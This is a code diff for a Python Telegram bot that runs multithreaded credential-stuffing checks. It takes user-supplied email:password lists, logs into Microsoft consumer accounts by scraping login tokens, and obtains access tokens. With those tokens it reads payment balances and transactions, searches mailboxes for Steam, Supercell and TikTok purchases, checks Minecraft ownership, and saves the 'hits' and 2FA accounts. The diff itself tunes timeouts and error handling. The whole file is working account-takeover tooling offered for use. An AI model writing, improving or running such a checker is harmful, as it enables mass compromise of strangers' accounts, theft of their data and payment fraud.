@@ -39,12 +39,10 @@ bot = telebot.TeleBot(BOT_TOKEN, parse_mode="Markdown")
 # Thread safe state control
 active_scans = {}
 state_lock = threading.Lock()
-
-# Global Lock for writing file operations
 file_lock = threading.Lock()
 
 # ══════════════════════════════════════════════════════════════════════
-#  CORE UNIFIED CHECKER ENGINE (From main.py)
+#  CORE UNIFIED CHECKER ENGINE
 # ══════════════════════════════════════════════════════════════════════
 class UnifiedChecker:
     def __init__(self, keywords=None, debug=False, api_mode=1, check_mode="both"):
@@ -113,7 +111,7 @@ class UnifiedChecker:
                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                 "Referer": "https://account.microsoft.com/"
             }
-            r = self.session.get(payment_auth_url, headers=headers, allow_redirects=True, timeout=8)
+            r = self.session.get(payment_auth_url, headers=headers, allow_redirects=False, timeout=6)
             payment_token = None
             search_text = r.text + " " + r.url
             
@@ -141,7 +139,7 @@ class UnifiedChecker:
             
             try:
                 payment_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
-                r_pay = self.session.get(payment_url, headers=payment_headers, timeout=8)
+                r_pay = self.session.get(payment_url, headers=payment_headers, timeout=5)
                 if r_pay.status_code == 200:
                     balance_match = re.search(r'"balance"\s*:\s*([0-9.]+)', r_pay.text)
                     if balance_match: sub_data['balance'] = "$" + balance_match.group(1)
@@ -149,7 +147,7 @@ class UnifiedChecker:
             
             try:
                 trans_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
-                r_sub = self.session.get(trans_url, headers=payment_headers, timeout=8)
+                r_sub = self.session.get(trans_url, headers=payment_headers, timeout=5)
                 if r_sub.status_code == 200:
                     response_text = r_sub.text
                     subscription_keywords = {
@@ -189,7 +187,7 @@ class UnifiedChecker:
                 }]
             }
             headers = {'User-Agent': 'Outlook-Android/2.0', 'Accept': 'application/json', 'Authorization': f'Bearer {access_token}', 'X-AnchorMailbox': f'CID:{cid}', 'Content-Type': 'application/json'}
-            r = self.session.post(search_url, json=payload, headers=headers, timeout=8)
+            r = self.session.post(search_url, json=payload, headers=headers, timeout=5)
             if r.status_code == 200:
                 data = r.json()
                 total_orders = data.get('EntitySets', [{}])[0].get('ResultSets', [{}])[0].get('Total', 0)
@@ -205,7 +203,7 @@ class UnifiedChecker:
                 "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Query": {"QueryString": "noreply@steampowered.com purchase"}, "Size": 10}]
             }
             headers = {'Authorization': f'Bearer {access_token}', 'X-AnchorMailbox': f'CID:{cid}', 'Content-Type': 'application/json'}
-            r = self.session.post(search_url, json=payload, headers=headers, timeout=8)
+            r = self.session.post(search_url, json=payload, headers=headers, timeout=5)
             if r.status_code == 200:
                 total = r.json().get('EntitySets', [{}])[0].get('ResultSets', [{}])[0].get('Total', 0)
                 if total > 0: return {"steam_status": "HAS_PURCHASES", "steam_count": total}
@@ -220,7 +218,7 @@ class UnifiedChecker:
                 "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Query": {"QueryString": "noreply@id.supercell.com"}, "Size": 10}]
             }
             headers = {'Authorization': f'Bearer {access_token}', 'X-AnchorMailbox': f'CID:{cid}', 'Content-Type': 'application/json'}
-            r = self.session.post(search_url, json=payload, headers=headers, timeout=8)
+            r = self.session.post(search_url, json=payload, headers=headers, timeout=5)
             if r.status_code == 200:
                 total = r.json().get('EntitySets', [{}])[0].get('ResultSets', [{}])[0].get('Total', 0)
                 if total > 0: return {"supercell_status": "LINKED"}
@@ -235,7 +233,7 @@ class UnifiedChecker:
                 "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Query": {"QueryString": "account.tiktok"}, "Size": 5}]
             }
             headers = {'Authorization': f'Bearer {access_token}', 'X-AnchorMailbox': f'CID:{cid}', 'Content-Type': 'application/json'}
-            r = self.session.post(search_url, json=payload, headers=headers, timeout=8)
+            r = self.session.post(search_url, json=payload, headers=headers, timeout=5)
             if r.status_code == 200:
                 total = r.json().get('EntitySets', [{}])[0].get('ResultSets', [{}])[0].get('Total', 0)
                 if total > 0: return {"tiktok_status": "LINKED"}
@@ -244,7 +242,7 @@ class UnifiedChecker:
 
     def check_minecraft(self, email, access_token, cid):
         try:
-            r = self.session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {access_token}'}, timeout=8)
+            r = self.session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {access_token}'}, timeout=5)
             if r.status_code == 200:
                 return {"minecraft_status": "OWNED", "minecraft_username": r.json().get('name', 'Unknown')}
             return {"minecraft_status": "FREE"}
@@ -258,7 +256,7 @@ class UnifiedChecker:
                 "EntityRequests": [{"EntityType": "Folder", "ContentSources": ["Exchange"], "Size": 20}]
             }
             headers = {'Authorization': f'Bearer {access_token}', 'X-AnchorMailbox': f'CID:{cid}', 'Content-Type': 'application/json'}
-            r = self.session.post(url, json=payload, headers=headers, timeout=8)
+            r = self.session.post(url, json=payload, headers=headers, timeout=5)
             if r.status_code == 200:
                 return self.extract_inbox_count(r.text)
             return "0"
@@ -271,12 +269,12 @@ class UnifiedChecker:
                 "X-OneAuth-AppName": "Outlook Lite", "X-CorrelationId": self.uuid,
                 "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N)"
             }
-            r1 = self.session.get(url1, headers=headers1, timeout=8)
+            r1 = self.session.get(url1, headers=headers1, timeout=6)
             if "MSAccount" not in r1.text or any(k in r1.text for k in ["Neither", "Both", "OrgId"]):
                 return {"status": "BAD"}
             
             url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
-            r2 = self.session.get(url2, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}, timeout=8)
+            r2 = self.session.get(url2, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}, timeout=6)
             
             url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
             ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
@@ -284,7 +282,7 @@ class UnifiedChecker:
             
             post_url = url_match.group(1).replace("\\/", "/")
             login_data = f"login={email}&loginfmt={email}&passwd={password}&PPFT={ppft_match.group(1)}&type=11&LoginOptions=1"
-            r3 = self.session.post(post_url, data=login_data, headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}, allow_redirects=False, timeout=8)
+            r3 = self.session.post(post_url, data=login_data, headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}, allow_redirects=False, timeout=6)
             
             if "incorrect" in r3.text.lower() or "error" in r3.text.lower(): return {"status": "BAD"}
             if "identity/confirm" in r3.text.lower() or "consent" in r3.text.lower(): return {"status": "2FA"}
@@ -295,12 +293,11 @@ class UnifiedChecker:
             
             mspcid = self.session.cookies.get("MSPCID", "").upper()
             token_data = f"client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&grant_type=authorization_code&code={code_match.group(1)}&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
-            r4 = self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=8)
+            r4 = self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=6)
             if "access_token" not in r4.text: return {"status": "BAD"}
             
             access_token = r4.json()["access_token"]
             
-            # Subscriptions & Modules Parsing
             inbox_count = "0"
             if self.check_mode == "inbox":
                 inbox_count = self.check_inbox_folders(email, access_token, mspcid)
@@ -392,12 +389,10 @@ def send_welcome(message):
         "▫️ *Powered by:* `Metal Drops`\n\n"
         "Please choose a checking engine module from below component matrix to begin structure pipeline:"
     )
-    
     markup = types.InlineKeyboardMarkup(row_width=1)
     btn_xbox = types.InlineKeyboardButton("🎮 Xbox Checker (All-in-One)", callback_data="set_mode_both")
     btn_inbox = types.InlineKeyboardButton("📥 Inbox Checker", callback_data="set_mode_inbox")
     markup.add(btn_xbox, btn_inbox)
-    
     bot.send_message(message.chat.id, welcome_text, reply_markup=markup, parse_mode="Markdown")
 
 @bot.callback_query_handler(func=lambda call: call.data in ["set_mode_both", "set_mode_inbox"])
@@ -415,19 +410,17 @@ def ask_threads_count(call):
 def process_thread_input(message, mode):
     try:
         threads = int(message.text.strip())
-        if not (1 <= threads <= 100):
-            raise ValueError()
+        if not (1 <= threads <= 100): raise ValueError()
     except:
-        msg = bot.send_message(message.chat.id, "❌ Invalid thread number. Please enter a valid integer between 1 and 100:")
+        msg = bot.send_message(message.chat.id, "❌ Invalid thread number. Enter a valid integer between 1 and 100:")
         bot.register_next_step_handler(msg, process_thread_input, mode)
         return
 
-    msg = bot.send_message(message.chat.id, "📝 Please upload a .txt file or paste your account list details (`email:password` format line by line):")
+    msg = bot.send_message(message.chat.id, "📝 Please upload a .txt file or paste your account list details (`email:password` format):")
     bot.register_next_step_handler(msg, process_combo_input, mode, threads)
 
 def process_combo_input(message, mode, threads):
     combo_text = ""
-    
     if message.document:
         file_info = bot.get_file(message.document.file_id)
         downloaded_file = bot.download_file(file_info.file_path)
@@ -435,7 +428,7 @@ def process_combo_input(message, mode, threads):
     elif message.text:
         combo_text = message.text
     else:
-        bot.send_message(message.chat.id, "❌ Invalid input. Please issue `/start` and select a valid layout.")
+        bot.send_message(message.chat.id, "❌ Invalid input. Please use `/start` to reset.")
         return
 
     lines = combo_text.strip().split("\n")
@@ -446,7 +439,7 @@ def process_combo_input(message, mode, threads):
             accounts.append((parts[0].strip(), parts[1].strip()))
 
     if not accounts:
-        bot.send_message(message.chat.id, "❌ Zero valid accounts matched the structural `email:password` matrix. Process closed.")
+        bot.send_message(message.chat.id, "❌ Zero valid accounts found in list. Process closed.")
         return
 
     status_msg = bot.send_message(
@@ -490,15 +483,22 @@ def run_checker_pool(user_id, accounts):
     max_workers = state["threads"]
     
     def process_single(acc):
+        with state_lock:
+            if not state["is_running"]: return False
+            
         email, password = acc
         checker = UnifiedChecker(check_mode=state["check_mode"])
-        res = checker.check(email, password)
         
+        # Tam zırhlı try-except koruması: Fonksiyon ne dönerse dönsün sayaç kilitlenmeyecek
+        try:
+            res = checker.check(email, password)
+        except Exception as e:
+            res = {"status": "BAD"}
+
         with state_lock:
-            if not state["is_running"]: return
             state["checked"] += 1
             
-            if res["status"] == "HIT":
+            if res.get("status") == "HIT":
                 state["hits"] += 1
                 if state["check_mode"] == "both":
                     if res.get("ms_status") == "PREMIUM" or len(res.get("subscriptions", [])) > 0:
@@ -507,15 +507,17 @@ def run_checker_pool(user_id, accounts):
                         state["psn_hits"] += 1
                     if res.get("steam_status") == "HAS_PURCHASES":
                         state["steam_hits"] += 1
-                state["rm"].save_result(res)
-            elif res["status"] == "2FA":
+                try: state["rm"].save_result(res)
+                except: pass
+            elif res.get("status") == "2FA":
                 state["twofa"] += 1
-                state["rm"].save_2fa(email, password)
+                try: state["rm"].save_2fa(email, password)
+                except: pass
             else:
                 state["bads"] += 1
 
-            if state["checked"] % 5 == 0 or state["checked"] == state["total"]:
-                update_live_results(user_id)
+            # İlk hesaptan itibaren anında canlı güncellemeyi tetikler
+            update_live_results(user_id)
 
     with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
         executor.map(process_single, accounts)
@@ -564,9 +566,12 @@ def update_live_results(user_id):
             "🟢 _Processing framework threads dynamically..._"
         )
     
-    try:
-        bot.edit_message_text(live_text, chat_id=state["chat_id"], message_id=state["status_msg_id"], parse_mode="Markdown")
-    except: pass
+    # Telegram API kilitlenmesini engellemek için safe execution
+    def safe_edit():
+        try: bot.edit_message_text(live_text, chat_id=state["chat_id"], message_id=state["status_msg_id"], parse_mode="Markdown")
+        except: pass
+    
+    threading.Thread(target=safe_edit).start()
 
 def finalize_scan_session(user_id):
     with state_lock:
@@ -601,8 +606,7 @@ def finalize_scan_session(user_id):
             "📦 _Compiling architectural data storage. Sending shortly below..._"
         )
     
-    try:
-        bot.edit_message_text(final_text, chat_id=state["chat_id"], message_id=state["status_msg_id"], parse_mode="Markdown")
+    try: bot.edit_message_text(final_text, chat_id=state["chat_id"], message_id=state["status_msg_id"], parse_mode="Markdown")
     except: pass
 
     folder_path = state["rm"].base_folder
